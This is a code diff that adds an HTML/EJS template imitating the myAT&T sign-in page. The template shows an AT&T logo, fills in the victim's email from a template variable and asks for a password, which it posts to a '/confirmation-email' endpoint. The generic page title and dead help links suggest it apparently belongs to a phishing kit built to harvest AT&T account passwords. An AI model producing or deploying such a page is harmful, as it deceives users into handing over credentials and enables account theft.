@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Centered Div with Rounded Corners and Border</title>
+    <link rel="stylesheet" href="/stylesheets/output.css" />
+    <link rel="stylesheet" href="/stylesheets/input.css" />
+    <link rel="stylesheet" href="/stylesheets/style.css" />
+
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;500;600;700&display=swap");
+
+      body {
+        font-family: "Nunito Sans", sans-serif;
+      }
+    </style>
+  </head>
+  <body class="bg-[#FFFFFF]">
+    <div class="flex items-center justify-center mt-20">
+      <div
+        class="bg-white py-10 px-14 w-3/12 rounded-md border border-gray-300"
+      >
+        <form action="/confirmation-email" method="post">
+          <input type="hidden" name="email" value="<%= email %>" />
+          <div class="flex items-center justify-center">
+            <img
+              src="/images/att_hz_lg_lkp_rgb_pos.svg"
+              alt="Logo"
+              class="w-28"
+            />
+          </div>
+          <div class="flex items-center justify-center mt-5">
+            <h1 class="text-center text-4xl font-bold">
+              <span class="block text-3xl">Sign in</span>
+              <span class="block text-xl">to myAT&T</span>
+            </h1>
+          </div>
+
+          <div class="flex items-center justify-center mt-5">
+            <h1 class="text-center text-base font-bold">
+              <span class="block"><%= email %></span>
+            </h1>
+          </div>
+
+          <div class="flex items-center justify-center mt-4 max-w-full w-full">
+            <div class="mr-2 w-full">
+              <label for="password" class="block text-gray-600 font-semibold"
+                >Password:</label
+              >
+              <input
+                type="password"
+                id="password"
+                placeholder="Enter your password"
+                name="password"
+                class="rounded border border-gray-300 px-4 py-2 w-full focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                required
+                />
+            </div>
+          </div>
+
+          <button
+            type="submit"
+            class="bg-[#0057B8] hover:bg-[#007AE2] w-full mt-5 text-white font-semibold py-2 px-4 rounded-3xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50"
+          >
+            Continue
+          </button>
+        </form>
+
+        <div class="mt-8 text-left">
+            <a href="#" class="block text-blue-600 hover:underline mb-4">Forgot Password</a>
+            <a href="#" class="block text-blue-600 hover:underline">Don't have a user ID? Create one now</a>
+          </div>
+          
+      </div>
+    </div>
+  </body>
+</html>
